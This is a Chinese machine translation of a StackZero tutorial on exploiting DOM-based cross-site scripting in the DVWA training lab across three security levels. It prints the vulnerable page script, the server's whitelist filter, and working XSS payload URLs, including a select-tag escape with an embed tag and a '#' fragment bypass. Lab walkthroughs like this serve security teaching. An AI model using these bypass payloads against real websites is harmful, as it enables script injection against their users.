<html>
<head>
<title>How Can You Exploit DOM XSS On DVWA — StackZero</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">你如何在DVWA-stack zero上利用多姆·XSS</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-to-exploit-dom-xss-on-dvwa-stackzero-c83a682ed7b7?source=collection_archive---------3-----------------------#2022-09-27">https://infosecwriteups.com/how-to-exploit-dom-xss-on-dvwa-stackzero-c83a682ed7b7?source=collection_archive---------3-----------------------#2022-09-27</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/c8b5feb71fe62d7d78a91899f3251c99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*zKV9DnQqKZW7NkWQ.jpg"/></div></div></figure><h1 id="35b4" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">介绍</h1><p id="ca39" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">嗨黑客们！又一篇关于XSS的文章。这次我们将在<a class="ae lx" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>上看到多姆This，以及对该漏洞的实际利用。</p><p id="b879" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">正如你可能已经猜到的，我特别提倡实践学习，在这种情况下，除了一些细节之外，与我们之前看到的没有太大的不同。</p><p id="9e65" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">我还想解决这个具体的演练，只是因为在现实世界中，通常工作的漏洞和不工作的漏洞之间的区别只是一个小细节。</p><p id="86e6" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">显然，在接下来的文章中，我将把之前文章中已经涉及的所有知识视为理所当然。<br/>如果有任何差距，我建议您在继续之前阅读以下教程:</p><ul class=""><li id="e61e" class="md me it lb b lc ly lg lz lk mf lo mg ls mh lw mi mj mk ml bi translated"><a class="ae lx" href="https://medium.com/codex/the-terrifying-world-of-cross-site-scripting-xss-part-1-stackzero-54be9cdc011a" rel="noopener">跨站脚本的恐怖世界(XSS)(第一部分)</a></li><li id="a3f4" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" href="https://medium.com/@stackzero/the-terrifying-world-of-cross-site-scripting-xss-part-2-stackzero-cc7fa7e8dcbb" rel="noopener">跨站脚本的恐怖世界(XSS)(第二部分)</a></li><li id="b263" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" href="https://medium.com/codex/xss-in-practice-how-to-exploit-xss-in-web-applications-walktrought-into-google-xss-game-c939f30005ea" rel="noopener">实践中的XSS:如何在web应用中利用XSS</a></li><li id="3d3e" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/reflected-xss-dvwa-an-exploit-with-real-world-consequences-stackzero-171cfb2d87d2">反映了XSS DVWA —一个具有真实世界后果的漏洞</a></li><li id="5e37" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/how-to-exploit-a-stored-xss-vulnerability-on-dvwa-stackzero-1de6cc9545b9">如何利用DVWA上存储的XSS漏洞</a></li><li id="8a2c" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/how-to-exploit-dom-xss-on-dvwa-stackzero-c83a682ed7b7">如何在DVWA上利用多姆XSS</a></li></ul><p id="387d" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">准备好了就可以准备你的<a class="ae lx" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>机器了(我用的是<a class="ae lx" href="https://tryhackme.com/room/dvwa" rel="noopener ugc nofollow" target="_blank"> TryHackMe </a>上的那台)，如果你不知道怎么做，我在这篇文章里简单解释了一下:<a class="ae lx" href="https://www.stackzero.net/how-to-hack-with-sql-injection-attacks-dvwa-low-security/" rel="noopener ugc nofollow" target="_blank">如何用SQL注入攻击进行黑客攻击！DVWA低保障</a>。</p><p id="11b1" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">在这个快速介绍之后，我相信你会准备好动手实践所有的概念。</p><h1 id="042e" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">第一步。低安全性的DVWA上的多姆XSS</h1><p id="6c8b" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">初始设置后的第一步是使用默认凭据登录计算机:</p><ul class=""><li id="4d91" class="md me it lb b lc ly lg lz lk mf lo mg ls mh lw mi mj mk ml bi translated"><strong class="lb iu">用户名</strong> : admin</li><li id="46e4" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><strong class="lb iu">密码</strong>:密码</li></ul><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mr"><img src="../Images/96b523ea844bda51e12d065abe16edc2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CflKR4BWUN2dWeaGdL6cqQ.jpeg"/></div></div></figure><p id="f17d" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">之后进入左侧菜单的设置，将安全性设置为低(记住默认安全性是<em class="mw">“不可能”</em>)。</p><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mr"><img src="../Images/e8d5a1ca606806ccf2fe70a0aeb5dbc7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*V4TU2Kz-8VX06-BzV5ENdQ.jpeg"/></div></div></figure><p id="cc84" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">每次需要更改安全级别时，我们都必须重复这个操作。</p><p id="6a2f" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">最后，初始准备已经结束，我们可以开始实际的利用！</p><p id="57ba" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">到目前为止，我们应该知道第一关只是一种热身，就像在<a class="ae lx" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>中一样，所以让我们尝试一下基本的漏洞利用，看看结果吧！</p><p id="44da" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">为此，我们需要识别易受攻击的输入。<br/>通过选择语言(例如英语)并点击<em class="mw">“选择”</em>按钮，URL以这种方式改变(IP地址取决于<a class="ae lx" href="https://github.com/digininja/DVWA" rel="noopener ugc nofollow" target="_blank"> DVWA </a>实例):<br/> <code class="fe mx my mz na b">http://10.10.37.210/vulnerabilities/xss_d/?default=English</code></p><p id="faa8" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">因此，该值作为GET值被传递到查询字符串<a class="ae lx" href="https://en.wikipedia.org/wiki/Query_string" rel="noopener ugc nofollow" target="_blank">中，这将是我们的目标。例如，试着用随机的东西替换那个值，就像这样:</a></p><p id="eb1a" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated"><code class="fe mx my mz na b"><a class="ae lx" href="http://10.10.37.210/vulnerabilities/xss_d/?default=StackZero" rel="noopener ugc nofollow" target="_blank">http://10.10.37.210/vulnerabilities/xss_d/?default=StackZero</a></code></p><p id="6aa7" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">我们可以看到，该参数反映在下拉菜单的默认项目中:</p><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/9606485bb7f1e51399f2042a50b74383.png" data-original-src="https://miro.medium.com/v2/resize:fit:1376/format:webp/1*geXScHRgQ1yqYx4-J81OyQ.jpeg"/></div></figure><p id="588f" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">为了以防万一，我们试着检查一下下拉菜单的代码(在Firefox中右键+ Inspect(Q)):</p><pre class="ms mt mu mv gt nc na nd ne aw nf bi"><span id="72b3" class="ng kc it na b gy nh ni l nj nk">&lt;select name="default"&gt;<br/>  &lt;script&gt;<br/>    if (document.location.href.indexOf("default=") &gt;= 0) {<br/>      var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);<br/>      document.write(" &lt; option value = '" + lang + "' &gt; " + decodeURI(lang) + " &lt; /option&gt;");<br/>          document.write(" &lt; option value = ''<br/>            disabled = 'disabled' &gt; -- -- &lt; /option&gt;");<br/>          }<br/>          document.write(" &lt; option value = 'English' &gt; English &lt; /option&gt;");<br/>            document.write(" &lt; option value = 'French' &gt; French &lt; /option&gt;");<br/>              document.write(" &lt; option value = 'Spanish' &gt; Spanish &lt; /option&gt;");<br/>                document.write(" &lt; option value = 'German' &gt; German &lt; /option&gt;");<br/>  &lt;/script&gt;<br/>  &lt;option value="StackZero"&gt;StackZero&lt;/option&gt;<br/>  &lt;option value="" disabled="disabled"&gt;----&lt;/option&gt;<br/>  &lt;option value="English"&gt;English&lt;/option&gt;<br/>  &lt;option value="French"&gt;French&lt;/option&gt;<br/>  &lt;option value="Spanish"&gt;Spanish&lt;/option&gt;<br/>  &lt;option value="German"&gt;German&lt;/option&gt;<br/>&lt;/select&gt;</span></pre><p id="8680" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">通过查看脚本，可以清楚地看到，默认值是使用函数<code class="fe mx my mz na b">document.location.href.substring(document.location.href.indexOf("default=") + 8);</code>从URL获取的</p><p id="81bc" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">“default=" + 8”的索引表示单词“default”的7个字符加上等号的一个字符之后的位置(记住，索引计数器从零开始计数)。</p><p id="7bec" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">我们已经在<a class="ae lx" href="https://medium.com/@stackzero/the-terrifying-world-of-cross-site-scripting-xss-part-2-stackzero-cc7fa7e8dcbb" rel="noopener">这篇文章</a>中看到了这种客户端的详细描述。</p><p id="623c" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">因此，我们可以通过在浏览器中键入以下URL来尝试用一个表示我们的基本漏洞的字符串来设置默认值:<br/> <code class="fe mx my mz na b">http://10.10.37.210/vulnerabilities/xss_d/?default=&lt;script&gt;alert('You have been hacked!');&lt;/script&gt;</code></p><p id="6746" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">exploit成功了，所以我们可以进入下一关了！</p><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nl"><img src="../Images/a28ba31abb34a1f74ca58261bedc4ea1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*al2FUN6uWjfPOIvgcueh-Q.jpeg"/></div></div></figure><h1 id="e60a" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">第二步。多姆·XSS在中等安全的DVWA上</h1><p id="2cba" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">我们处于中等水平，首先能做的就是尝试上一级的exploit，但显然，这是行不通的。</p><p id="7625" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">因此，我们可以推断有某种服务器端过滤阻止了<code class="fe mx my mz na b">&lt;script&gt;</code>标签。</p><p id="1a15" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">在<a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/reflected-xss-dvwa-an-exploit-with-real-world-consequences-stackzero-171cfb2d87d2">在DVWA </a>上反映XSS的文章中，我们试图通过键入一些大写字符的标签来绕过过滤器，但在这种情况下，这将是无效的，我们应该想出更多。</p><p id="d12a" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">通过检查下拉菜单，我们正在处理<code class="fe mx my mz na b">select</code>和<code class="fe mx my mz na b">option</code>标签，所以我们不能像过去那样放置一个图像并利用<em class="mw"> onerror </em>事件(或者类似的事情)。</p><p id="69e7" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">除了删除脚本标签，它似乎没有其他字符串处理例程，所以关闭选择标签并插入我们的漏洞似乎是一个非常好的主意。<br/>在<a class="ae lx" href="https://en.wikipedia.org/wiki/HTML" rel="noopener ugc nofollow" target="_blank"> HTML </a>中，<a class="ae lx" href="https://www.w3schools.com/tags/tag_embed.asp" rel="noopener ugc nofollow" target="_blank">嵌入标签</a>是一个外部资源的容器，所以我们将使用它来传递这个级别，并且我们将用这个值来设置我们的默认变量:</p><pre class="ms mt mu mv gt nc na nd ne aw nf bi"><span id="2e4d" class="ng kc it na b gy nh ni l nj nk">&lt;/select&gt; &lt;embed src="javascript:alert('You have been hacked')"&gt;</span></pre><p id="30a4" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">这样精心制作的URL将如下所示:</p><p id="8c28" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated"><code class="fe mx my mz na b">http://10.10.37.210/vulnerabilities/xss_d/?default=&lt;/select&gt; &lt;embed src="javascript:alert('You have been hacked')"&gt;</code></p><p id="1e80" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">而且等级又过了！</p><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nl"><img src="../Images/a28ba31abb34a1f74ca58261bedc4ea1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*al2FUN6uWjfPOIvgcueh-Q.jpeg"/></div></div></figure><p id="52ba" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">如果你想探索更多的漏洞并在这里测试它们，你可以看看这个<a class="ae lx" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" rel="noopener ugc nofollow" target="_blank">备忘单</a>。</p><p id="33d6" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">现在是时候进行了，所以将安全级别设置为“高”并跳到下一个级别！</p><h1 id="e856" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">第三步。多姆XSS在高安全性的DVWA</h1><p id="7af7" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">最后，我们到了最后一关，你可以自己尝试前面所有的技巧，但很遗憾，这一次它们似乎不起作用了。</p><p id="52f5" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">有一个过滤器比较难绕过，为了有个思路，这次可以稍微作弊一下，看看“查看源码”这样就能看到服务器的PHP了。<br/>这是我们要绕过的过滤器:</p><pre class="ms mt mu mv gt nc na nd ne aw nf bi"><span id="71ef" class="ng kc it na b gy nh ni l nj nk">&lt;?php<br/><br/>// Is there any input?<br/>if (array_key_exists("default", $_GET) &amp;&amp; !is_null($_GET["default"])) {<br/>    # White list the allowable languages<br/>    switch ($_GET["default"]) {<br/>        case "French":<br/>        case "English":<br/>        case "German":<br/>        case "Spanish":<br/>            # ok<br/>            break;<br/>        default:<br/>            header("location: ?default=English");<br/>            exit();<br/>    }<br/>} ?&gt;</span></pre><p id="5cd5" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">它只会接受一个预定义的声音，即使它似乎没有解决方案，我们仍然可以做一些事情。</p><p id="8505" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">在继续之前，我们需要知道浏览器是如何解释URI的:</p><blockquote class="nm nn no"><p id="055b" class="kz la mw lb b lc ly le lf lg lz li lj np ma lm ln nq mb lq lr nr mc lu lv lw im bi translated">查询组件由第一个问号(“？)字符，并以数字符号(" # ")字符或URI结束</p><p id="3e1b" class="kz la mw lb b lc ly le lf lg lz li lj np ma lm ln nq mb lq lr nr mc lu lv lw im bi translated"><a class="ae lx" href="https://www.rfc-editor.org/rfc/rfc3986" rel="noopener ugc nofollow" target="_blank"> <em class="it"> RFC 3986 </em> </a> <em class="it">第3.4节</em></p></blockquote><p id="3142" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">如果想了解更多，这是<a class="ae lx" href="https://www.rfc-editor.org/rfc/rfc3986#section-3.4" rel="noopener ugc nofollow" target="_blank">环节</a>。</p><p id="56c1" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">所以浏览器发送给服务器一个查询字符串<a class="ae lx" href="https://en.wikipedia.org/wiki/Query_string" rel="noopener ugc nofollow" target="_blank">什么在“？”和“#”但是它用它的javascript处理来自“default=" + 8”索引的子字符串(正如我们在第一步中看到的低安全级别)。</a></p><p id="38b8" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">我们想将正确的<a class="ae lx" href="https://en.wikipedia.org/wiki/Query_string" rel="noopener ugc nofollow" target="_blank">查询字符串</a>发送到服务器，通过键入“#”终止它，然后插入我们的漏洞。</p><p id="2762" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">让我们看看如何做到这一点，然后讨论一下，这是我们的利用:</p><pre class="ms mt mu mv gt nc na nd ne aw nf bi"><span id="d86b" class="ng kc it na b gy nh ni l nj nk">#&lt;script&gt;alert("You have been hacked");&lt;/script&gt;</span></pre><p id="3ce7" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">这是完整的恶意网址。</p><p id="74cb" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated"><code class="fe mx my mz na b">http://10.10.173.217/vulnerabilities/xss_d/?default=English#&lt;script&gt;alert("You have been hacked );&lt;/script&gt;</code></p><p id="e9f4" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">但是这个精心制作的URL会发生什么呢？</p><p id="3cf0" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">服务器接收此URL:</p><p id="ae47" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated"><code class="fe mx my mz na b"><a class="ae lx" href="http://10.10.173.217/vulnerabilities/xss_d/?default=English" rel="noopener ugc nofollow" target="_blank">http://10.10.173.217/vulnerabilities/xss_d/?default=English</a></code></p><p id="0f6f" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">所以它不会触发过滤器，因为是正确的，服务器很高兴！</p><p id="28ba" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">同时，浏览器会将这个字符串复制到它的lang变量中，然后反映到它的页面中:</p><p id="5f51" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated"><code class="fe mx my mz na b">English#&lt;script&gt;alert("You have been hacked );&lt;/script&gt;</code></p><p id="a607" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">因此，如果我们检查元素，结果应该是这样的(我只报告了感兴趣的部分):</p><pre class="ms mt mu mv gt nc na nd ne aw nf bi"><span id="dac2" class="ng kc it na b gy nh ni l nj nk">&lt;option value="English#%3Cscript%3Ealert(%22You%20have%20been%20hacked%22);%3C/script%3E"&gt;English# &lt;script&gt;<br/>      alert("You have been hacked");<br/>    &lt;/script&gt;<br/>  &lt;/option&gt;<br/>  &lt;option value="" disabled="disabled"&gt;----&lt;/option&gt;<br/>  &lt;option value="English"&gt;English&lt;/option&gt;<br/>  &lt;option value="French"&gt;French&lt;/option&gt;<br/>  &lt;option value="Spanish"&gt;Spanish&lt;/option&gt;<br/>  &lt;option value="German"&gt;German&lt;/option&gt;</span></pre><p id="f7c8" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">让我们连接到网址，看看结果！</p><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nl"><img src="../Images/a28ba31abb34a1f74ca58261bedc4ea1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*al2FUN6uWjfPOIvgcueh-Q.jpeg"/></div></div></figure><p id="73d2" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">它再次工作，所以我们完成了，甚至这一节是完整的！我们可以为自己感到骄傲！</p><h1 id="ceba" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">结论</h1><p id="999f" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">这种XSS不像其他类型的那样常见，但是知道这一点可以让你作为程序员避免许多错误，或者作为白帽黑客获得一些奖金。<br/>我建议大家尽量多练习，掌握概念，让概念自然。网络上有很多挑战，你要准备好面对它们！</p><p id="9dee" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">在以后的帖子中，我们将通过一些例子来看看这种漏洞有多危险，敬请关注！</p><p id="c5c6" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">我希望解释是详尽的，我很喜欢写这篇文章！</p><p id="04ca" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">如果你喜欢这类文章，请继续关注我的博客和社交。<br/>谢谢！</p></div><div class="ab cl ns nt hx nu" role="separator"><span class="nv bw bk nw nx ny"/><span class="nv bw bk nw nx ny"/><span class="nv bw bk nw nx"/></div><div class="im in io ip iq"><p id="e8c9" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated"><em class="mw">原载于2022年9月27日https://www.stackzero.net</em><em class="mw">T21</em><a class="ae lx" href="https://www.stackzero.net/dom-xss-dvwa/" rel="noopener ugc nofollow" target="_blank">。</a></p><h2 id="d151" class="ng kc it bd kd nz oa dn kh ob oc dp kl lk od oe kp lo of og kt ls oh oi kx oj bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae lx" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4条线索、3个视频、2个GitHub Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>